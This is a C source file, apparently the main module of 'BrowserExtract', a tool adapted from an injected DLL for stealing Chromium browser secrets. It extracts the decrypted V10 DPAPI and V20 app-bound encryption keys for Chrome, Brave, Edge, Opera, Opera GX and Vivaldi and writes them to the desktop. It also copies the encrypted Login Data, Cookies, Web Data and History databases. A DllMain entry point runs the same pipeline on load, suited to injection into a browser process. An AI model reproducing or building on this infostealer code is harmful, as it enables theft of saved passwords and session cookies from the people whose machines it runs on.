// BrowserExtract - standalone conversion of the DllExtractChromiumSecrets DLL.
//
// Original flow (DLL, injected inside the browser process):
//   DllMain -> DetectBrowserFromProcess -> thread -> V10/V20 key extraction -> named pipe.
//
// This EXE flow (no injection, everything local to functions):
//   main -> check installed browser types -> extract V10 (DPAPI) + V20 (app-bound) keys
//        -> write keys to the desktop -> copy the raw (encrypted) browser DB files to the desktop.
//
// Dual build (same source, selected by _DLL):
//   _DLL defined (compiler sets it with the dynamic CRT /MD or /MDd - i.e. a
//                 DynamicLibrary build using the default runtime library)
//     -> DllMain DLL_PROCESS_ATTACH spawns a worker thread running the pipeline.
//   _DLL absent (static CRT /MT or /MTd - the EXE configurations)
//     -> console EXE, main() runs the pipeline directly.

#include "Common.h"
#include "BrowserDefs.h"
#include "KeyExtract.h"
#include "DbCopy.h"

// Writes one extracted key as a hex text file into the browser output dir and logs it.
static BOOL WriteKeyToOutputDir(IN LPCSTR pszOutputDir, IN LPCSTR pszFileName, IN PBYTE pbKey, IN DWORD cbKey, IN LPCSTR pszKeyLabel)
{
    CHAR    szKeyPath[MAX_PATH] = { 0 };
    LPSTR   pszHexKey           = NULL;

    if (!(pszHexKey = BytesToHexString(pbKey, cbKey)))
        return FALSE;

    printf("[+] %s: %s\n", pszKeyLabel, pszHexKey);

    wsprintfA(szKeyPath, "%s\\%s", pszOutputDir, pszFileName);

    if (WriteFileToDiskA(szKeyPath, (PBYTE)pszHexKey, lstrlenA(pszHexKey)))
        printf("[+] Written To '%s'\n", szKeyPath);
    else
        printf("[!] Failed To Write '%s'\n", szKeyPath);

    HEAP_FREE_SECURE(pszHexKey, lstrlenA(pszHexKey));

    return TRUE;
}

// Full per-browser pipeline: keys first, then the raw DB files.
static VOID ProcessBrowser(IN BROWSER_TYPE Browser, IN LPCSTR pszBrowserDir)
{
    PBYTE   pbKey           = NULL;
    DWORD   cbKey           = 0x00;
    LPSTR   pszBrowserName  = NULL;

    if (!(pszBrowserName = GetBrowserName(Browser)))
        return;

    printf("\n[i] =========================== %s ===========================\n", pszBrowserName);

    // Extract the V10 key (os_crypt.encrypted_key, DPAPI protected)
    if (ExtractDecryptedV10KeyFromLocalState(Browser, &pbKey, &cbKey))
    {
        const CHAR szKeyFileName[] = "key_v10_hex.txt";

        WriteKeyToOutputDir(pszBrowserDir, szKeyFileName, pbKey, cbKey, "V10 Decrypted Key");
        HEAP_FREE_SECURE(pbKey, cbKey);
        cbKey = 0;
    }
    else
    {
        printf("[!] ExtractDecryptedV10KeyFromLocalState Failed For %s\n", pszBrowserName);
    }

    // Extract the V20 key (os_crypt.app_bound_encrypted_key, elevation service) -
    // only Chrome, Edge and Brave ship the app-bound elevation service.
    if (BrowserSupportsV20Key(Browser))
    {
        if (ExtractDecryptedV20KeyFromLocalState(Browser, &pbKey, &cbKey))
        {
            const CHAR szKeyFileName[] = "key_v20_hex.txt";

            WriteKeyToOutputDir(pszBrowserDir, szKeyFileName, pbKey, cbKey, "V20 Decrypted Key");
            HEAP_FREE_SECURE(pbKey, cbKey);
            cbKey = 0;
        }
        else
        {
            printf("[!] ExtractDecryptedV20KeyFromLocalState Failed For %s\n", pszBrowserName);
        }
    }

    HEAP_FREE(pszBrowserName);

    // Copy the raw, still-encrypted DB files (Login Data, Cookies, Web Data, History, ...)
    CopyBrowserFilesToOutputDir(Browser, pszBrowserDir);
}

// Core pipeline shared by both build types: check installed browser types,
// extract the keys, write them to the desktop and copy the raw DB files.
// Returns 0 on success, 1 when no supported browser data was found.
static DWORD RunBrowserExtract(VOID)
{
    BROWSER_TYPE    Browsers[] = {
        BROWSER_CHROME,
        BROWSER_BRAVE,
        BROWSER_EDGE,
        BROWSER_OPERA,
        BROWSER_OPERA_GX,
        BROWSER_VIVALDI
    };

    const DWORD     dwBrowserCount      = sizeof(Browsers) / sizeof(Browsers[0]);
    const CHAR      szRootDirName[]     = "BrowserExtract";
    CHAR            szDesktop[MAX_PATH] = { 0 };
    CHAR            szRootDir[MAX_PATH] = { 0 };
    CHAR            szBrowserDir[MAX_PATH] = { 0 };
    DWORD           dwProcessed         = 0x00;

    printf("==[ BrowserExtract ]==\n");
    printf("[*] Checking Installed Browser Types ...\n");

    if (!GetDesktopDirectoryA(szDesktop, MAX_PATH))
        return 1;

    // Desktop\BrowserExtract\<BrowserName> output layout
    wsprintfA(szRootDir, "%s\\%s", szDesktop, szRootDirName);
    SHCreateDirectoryExA(NULL, szRootDir, NULL);

    for (DWORD i = 0; i < dwBrowserCount; i++)
    {
        LPSTR pszBrowserName = NULL;

        // Browser type check: the data root must contain a "Local State" file
        if (!IsBrowserDataPresent(Browsers[i]))
        {
            if ((pszBrowserName = GetBrowserName(Browsers[i])) != NULL)
            {
                printf("[-] %s: Not Installed (Skipped)\n", pszBrowserName);
                HEAP_FREE(pszBrowserName);
            }
            continue;
        }

        if ((pszBrowserName = GetBrowserName(Browsers[i])) == NULL)
            continue;

        printf("[+] %s: Detected\n", pszBrowserName);

        wsprintfA(szBrowserDir, "%s\\%s", szRootDir, pszBrowserName);
        SHCreateDirectoryExA(NULL, szBrowserDir, NULL);

        HEAP_FREE(pszBrowserName);

        ProcessBrowser(Browsers[i], szBrowserDir);
        dwProcessed++;
    }

    if (dwProcessed == 0)
    {
        printf("[!] No Supported Browser Data Found, Aborting...\n");
        return 1;
    }

    printf("\n[+] Done. %lu Browser(s) Processed. Output: %s\n", dwProcessed, szRootDir);
    return 0;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Entry points

#ifdef _WINDLL

BOOL APIENTRY DllMain(IN HMODULE hModule, IN DWORD dwReason, IN LPVOID lpReserved)
{
    HANDLE  hThread = NULL;

    UNREFERENCED_PARAMETER(lpReserved);

    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        if (!(hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunBrowserExtract, NULL, 0, NULL)))
            return FALSE;

        CloseHandle(hThread);
    }
    // DLL_THREAD_ATTACH / DLL_THREAD_DETACH / DLL_PROCESS_DETACH: nothing to do

    return TRUE;
}

#else // !_DLL

// EXE build: run the pipeline directly.
int main(void)
{
    return (int)RunBrowserExtract();
}

#endif // _DLL
